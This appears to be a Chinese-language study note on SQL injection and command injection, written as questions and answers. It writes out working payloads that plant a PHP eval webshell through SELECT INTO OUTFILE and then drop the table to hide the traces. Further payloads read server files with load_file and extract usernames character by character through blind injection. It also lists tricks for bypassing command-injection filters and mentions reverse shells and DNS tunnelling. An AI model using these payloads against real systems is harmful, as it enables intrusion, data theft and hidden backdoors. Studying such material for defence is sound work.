# **SQL注入与命令执行**

## 1.思考SQL注入采用什么方法植入WebShell？
一般过程：
先建立一个数据表

``Create TABLE a (cmd text NOT NULL);``

写入往里面写个一句话

``Insert INTO a (cmd) VALUES('<?php @eval($_POST[p45])?>');``

把这个数据表的内容导出来

``select cmd from a into outfile '路径/out.php';``

删掉这个数据库避免被发现

``Drop TABLE IF EXISTS a;``

 **大体思路是将shell先注入到库中，然后再通过各种途径导出到文件中**

## 2.SQL注入能否查看文件？

**mysql的默认家目录的属主属组都是mysql,so.....**

**0x01: 先判断是否有权限：**

``127.0.0.1/test.php?id=1 and (select count(file_priv) from mysql.user) >0--``
>file_priv:权限表，确定用户是否可以执行SELECT INTO OUTFILE和LOAD DATA INFILE命令。**[更多权限表](http://www.cnblogs.com/kissdodog/p/4173337.html)**

**0x02:使用load_file读文件**

``127.0.0.1/test.php?id=-1 union select 1,2,load_file('D:/wamp/www/test.txt')--``

D:/wamp/www/test.txt可替换为十六进制的.

``127.0.0.1/test.php?id=1 union select 1,2,load_file(char('0x443A2F77616D702F7777772F746573742E747874'))``


## 3.思考SQL注入盲注的原理以及利用方法

>sql盲注是sql注入的一种，之所以称为盲注是因为它不会根据你sql注入的攻击语句返回你想要知道的错误信息。

利用（数字型的注入为例）：

因为是盲注，一般表现可能只是返回 **true** 或者是 **false**，所以可以一步步猜测目标数据库的内容具体是啥，比如判断是否存在名字叫admin的表：

``127.0.0.1/test.php?id=1 and exists(select count(*) from admin) ``

此时，如果页面并没有报错（或者显示空白）一般就说明存在此表，当然可以验证一下其他名字

``127.0.0.1/test.php?id=1 and exists(select count(*) from xjbluanshu) ``

以上这句明显是不存在的，对比两句就能得出结果。。。

当然，对于用户名及密码我们可以先进行字符串长度的判断再进行逐个字符的猜测

```
?id=1 and (select count(*) from [user]) >=5 //查询表里有多少条数据（此处为>=5）
?id=1 and (select len(name) from [user]) =5  //查询用户名长度（此处为5）
?id=1 and (select ASCII(SUBSTRING(name,1,1)) from [user])= 97 //如果返回true则这说明 第一位 ASCII值为 97，对应字母 a以此类推 ，第2位，第3位 .....第5位，在这里主要用了 ASCII  和 SUBSTRING 函数
```
当然了，密码也是一样的道理

..............

**这过程明明就是重复的机械动作，为何不交给脚本去实现呢......**

## 4.查资料都有哪些绕过命令注入过滤技巧？

1.使用通配符
2.使用字符串拼接
3.使用上文中提到的先对内容进行编码再解码

## 5.检测命令注入漏洞时没有回显怎么办？

人为留下一些回显点，如：
1.反弹一个shell
2.DNS隧道
3.web日志
4........

## 6.怎么通过命令注入漏洞反弹shell？

**[这是一个方法](https://www.cnblogs.com/KevinGeorge/p/8120226.html)**,没试过，有机会玩玩
